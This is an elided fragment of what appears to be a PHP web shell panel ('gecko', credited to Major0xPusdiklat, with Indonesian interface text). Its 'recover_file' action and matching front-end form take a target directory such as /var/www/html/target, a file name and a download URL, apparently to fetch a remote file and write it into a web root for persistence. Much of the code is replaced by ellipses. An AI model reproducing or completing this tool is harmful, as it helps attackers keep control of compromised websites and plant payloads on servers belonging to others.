...
function geckoRecoverTarget($dirPath, $fileName, $downloadUrl)
{
...
if (isset($_GET['api'])) {
    ...
    switch ($action) {
        ...
        case 'recover_file':
            ...
            $result = geckoRecoverTarget($vDir[1], $vFile[1], $vUrl[1]);
            if (!$result['ok']) jsonOut($result, 400);
            jsonOut($result);
            break;
...
<div class="overlay" id="mRecover">
  <div class="modal m-lg tool-modal">
    ...
    <div class="modal-body">
      <div class="sec-callout">Created By <code>Major0xPusdiklat</code>: Recover Files</div>
      <div class="tool-grid" style="margin-top:14px">
        <div class="fg span2"><label>DIR_PATH</label><input type="text" id="recDirPath" placeholder="/var/www/html/target" autocomplete="off"></div>
...
function openRecover(){
  ...
  const out=$('#recOutput');
  if(out){
    out.textContent='Isi DIR_PATH, FILE_NAME, DOWNLOAD_URL lalu klik Recover.';
...
async function runRecover(){
  ...
  if(out){ out.textContent='Running recover…'; out.className='tool-output tall sec-terminal-out'; }
  if(btn){ btn.disabled=true; btn.textContent='Running…'; }
  let d;
  try{
    d=await api('recover_file',{dir_path:dir_path,file_name:file_name,download_url:download_url});
  }catch(e){
